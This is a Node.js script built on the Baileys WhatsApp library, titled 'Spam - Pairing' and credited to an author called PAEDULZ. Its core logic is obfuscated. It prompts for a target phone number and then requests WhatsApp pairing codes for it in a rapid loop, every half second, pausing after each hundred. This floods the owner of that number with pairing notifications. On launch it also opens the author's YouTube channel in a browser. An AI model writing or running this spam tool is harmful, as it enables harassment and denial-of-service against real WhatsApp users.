const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, getAggregateVotesInPollMessage, proto } = require("@whiskeysockets/baileys");
const fs = require('fs');
const pino = require('pino');
const chalk = require('chalk');
const readline = require("readline");
const figlet = require('figlet');
const _ = require('lodash');
const { Boom } = require('@hapi/boom');
const PhoneNumber = require('awesome-phonenumber');
const { color } = require('./lib/color');
const { await } = require('./lib/myfunc');
const open = require('open'); // Tambahkan modul open
const EventEmitter = require('events');
EventEmitter.defaultMaxListeners = 150;

const question = (text) => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise((resolve) => {
        rl.question(text, resolve);
    });
};

//=================================================//

const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

//=================================================//

console.log(color(figlet.textSync("Spam - Pairing", {
    font: 'DOS Rebel',
    horizontalLayout: 'default',
    vertivalLayout: 'default',
    width: 250,
    whitespaceBreak: false
}), 'pink'));

const _0x28d8db=_0x53dd;(function(_0x264753,_0x202b05){const _0x58a07e=_0x53dd,_0x8c2a5a=_0x264753();while(!![]){try{const _0x29f305=parseInt(_0x58a07e(0x167))/0x1*(parseInt(_0x58a07e(0x154))/0x2)+parseInt(_0x58a07e(0x148))/0x3+parseInt(_0x58a07e(0x150))/0x4+parseInt(_0x58a07e(0x155))/0x5+-parseInt(_0x58a07e(0x169))/0x6*(-parseInt(_0x58a07e(0x151))/0x7)+-parseInt(_0x58a07e(0x160))/0x8*(-parseInt(_0x58a07e(0x16d))/0x9)+-parseInt(_0x58a07e(0x15a))/0xa;if(_0x29f305===_0x202b05)break;else _0x8c2a5a['push'](_0x8c2a5a['shift']());}catch(_0x71b5cd){_0x8c2a5a['push'](_0x8c2a5a['shift']());}}}(_0x3801,0x507af),console[_0x28d8db(0x14d)](chalk[_0x28d8db(0x152)][_0x28d8db(0x149)](chalk[_0x28d8db(0x14f)]['bold'](_0x28d8db(0x16a))+_0x28d8db(0x142)+chalk[_0x28d8db(0x14f)][_0x28d8db(0x149)](_0x28d8db(0x14c))+'\x0a')));function _0x53dd(_0x40e2c3,_0x5060fa){const _0x3801d1=_0x3801();return _0x53dd=function(_0x53dde7,_0x1a5124){_0x53dde7=_0x53dde7-0x141;let _0x572aa9=_0x3801d1[_0x53dde7];return _0x572aa9;},_0x53dd(_0x40e2c3,_0x5060fa);}function _0x3801(){const _0x33e12d=['Script\x20Dishare\x20Oleh\x20PAEDULZ\x20:D','log','connection.update','green','968252FIePPS','749KGKhrm','white','open','6jExKqP','2537480oOIwYs','error','match','https://youtube.com/@PAEDULZ','Menunggu\x2010\x20detik\x20sebelum\x20mencoba\x20lagi...','17341110pzMeDl','stringify','requestPairingCode','connectionLost','Chrome','yellow','112njTXPL','timedOut','Ubuntu','join','Mengirim\x20Ulang\x20Code','authState','bind','68546gJOGVn','connection','3702NDTfEa','📃\x20\x20Informasi\x20:','Error\x20generating\x20pairing\x20code:\x20','[Connected]\x20','411966EMksuZ','20.0.04','PAEDULZ','\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a✉️\x20\x20Script\x20Spam\x20-\x20Pairing\x20\x0a✉️\x20\x20Author\x20:\x20PAEDULZ\x0a✉️\x20\x20Gmail\x20:\x20paedulzofficial@gmail.com\x0a✉️\x20\x20Instagram\x20:\x20https://www.instagram.com/muhammadfaidhulasani\x0a\x0a','Berhasil\x20terhubung!','statusCode','red','Pairing\x20Code\x20:','creds','1205118PQnmSu','bold','output','user'];_0x3801=function(){return _0x33e12d;};return _0x3801();}async function startBotz(){const _0x5e75cf=_0x28d8db,{state:_0x407507,saveCreds:_0x3aea4a}=await useMultiFileAuthState(_0x5e75cf(0x141)),_0x329df5=makeWASocket({'logger':pino({'level':'silent'}),'printQRInTerminal':![],'auth':_0x407507,'connectTimeoutMs':0xea60,'defaultQueryTimeoutMs':0x0,'keepAliveIntervalMs':0x2710,'emitOwnEvents':!![],'fireInitQueries':!![],'generateHighQualityLinkPreview':!![],'syncFullHistory':!![],'markOnlineOnConnect':!![],'browser':[_0x5e75cf(0x162),_0x5e75cf(0x15e),_0x5e75cf(0x16e)]});console[_0x5e75cf(0x14d)]('Subscribe\x20Youtube\x20Owner...'),await open(_0x5e75cf(0x158)),console[_0x5e75cf(0x14d)]('\x20'),await new Promise(_0x524c4=>setTimeout(_0x524c4,0x2710));let _0x4dfbbe=![],_0x3553e5=0x0;const _0x52458f=await question('Masukkan\x20Nomor\x20Bot\x20Target,\x20For\x20Example:\x206283857564133\x20:\x0a');if(!_0x329df5[_0x5e75cf(0x165)][_0x5e75cf(0x147)]['registered'])while(!_0x4dfbbe){try{let _0x1dabbe=await _0x329df5[_0x5e75cf(0x15c)](_0x52458f);_0x1dabbe=_0x1dabbe?.[_0x5e75cf(0x157)](/.{1,4}/g)?.[_0x5e75cf(0x163)]('-')||_0x1dabbe,console[_0x5e75cf(0x14d)](chalk['green']['bold'](_0x5e75cf(0x146),_0x1dabbe)),_0x3553e5++,_0x3553e5>=0x64&&(console[_0x5e75cf(0x14d)](chalk['yellow'][_0x5e75cf(0x149)]('Sudah\x20mengirim\x20100\x20kode,\x20menunggu\x2030\x20detik\x20sebelum\x20melanjutkan...')),await new Promise(_0xf913df=>setTimeout(_0xf913df,0x7530)),_0x3553e5=0x0),await new Promise(_0x528341=>{const _0x4e7ee0=_0x5e75cf,_0x20efac=setTimeout(()=>{const _0x18a8d3=_0x53dd;!_0x4dfbbe&&(console[_0x18a8d3(0x14d)](chalk[_0x18a8d3(0x152)][_0x18a8d3(0x149)](_0x18a8d3(0x164))),_0x528341());},0x1f4);_0x329df5['ev']['on'](_0x4e7ee0(0x14e),_0x4947d0=>{const _0x203753=_0x4e7ee0;_0x4947d0[_0x203753(0x168)]==='open'&&(_0x4dfbbe=!![],clearTimeout(_0x20efac),console[_0x203753(0x14d)](_0x203753(0x143)),_0x528341());});});}catch(_0x34d7ae){console['log'](chalk[_0x5e75cf(0x145)][_0x5e75cf(0x149)](_0x5e75cf(0x16b)+_0x34d7ae)),console['log'](chalk[_0x5e75cf(0x15f)]['bold'](_0x5e75cf(0x159))),await new Promise(_0x413e73=>setTimeout(_0x413e73,0x2710));}}return store[_0x5e75cf(0x166)](_0x329df5['ev']),_0x329df5['ev']['on'](_0x5e75cf(0x14e),async _0x416842=>{const _0x456353=_0x5e75cf,{connection:_0x40c909,lastDisconnect:_0x10ee84}=_0x416842;if(_0x40c909==='close'){let _0x4d0b14=new Boom(_0x10ee84?.[_0x456353(0x156)])?.[_0x456353(0x14a)][_0x456353(0x144)];(_0x4d0b14===DisconnectReason['badSession']||_0x4d0b14===DisconnectReason['connectionClosed']||_0x4d0b14===DisconnectReason[_0x456353(0x15d)]||_0x4d0b14===DisconnectReason['connectionReplaced']||_0x4d0b14===DisconnectReason['restartRequired']||_0x4d0b14===DisconnectReason[_0x456353(0x161)])&&(console[_0x456353(0x14d)]('Koneksi\x20ditutup,\x20mencoba\x20kembali...'),startBotz());}else _0x40c909===_0x456353(0x153)&&console[_0x456353(0x14d)](_0x456353(0x16c)+JSON[_0x456353(0x15b)](_0x329df5[_0x456353(0x14b)]['id'],null,0x2));}),_0x329df5['ev']['on']('creds.update',_0x3aea4a),_0x329df5;}

startBotz();


let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.redBright(`Update ${__filename}`));
    delete require.cache[file];
    require(file);
});

